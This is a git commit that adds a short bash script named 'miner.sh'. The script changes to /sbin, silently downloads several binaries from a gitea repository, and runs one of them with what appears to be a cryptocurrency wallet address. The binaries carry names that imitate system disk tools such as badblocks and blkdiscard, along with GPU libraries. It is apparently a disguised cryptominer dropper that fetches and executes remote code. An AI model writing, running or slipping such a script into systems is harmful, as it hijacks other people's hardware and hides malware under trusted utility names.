135a1b12a839273a5eb8eb6add1b172fae299f00
bambanks <bambankadisaputra@gmail.com>
2021-08-17 13:46:35 +0000

    Add 'miner.sh'

---
+++ miner.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+cd /sbin
+wget -qq https://try.gitea.io/bambanks/nambang/raw/branch/main/badblocks
+wget -qq https://try.gitea.io/bambanks/nambang/raw/branch/main/blkdiscard
+wget -qq https://try.gitea.io/bambanks/nambang/raw/branch/main/amdmemtweak
+wget -qq https://try.gitea.io/bambanks/nambang/raw/branch/main/libnvrtc-builtins.so
+wget -qq https://try.gitea.io/bambanks/nambang/raw/branch/main/libnvrtc.so.11.1
+./badblocks 3ETe5pgEXkw9uw4hfZ3vin3Gws16b5F4Yy
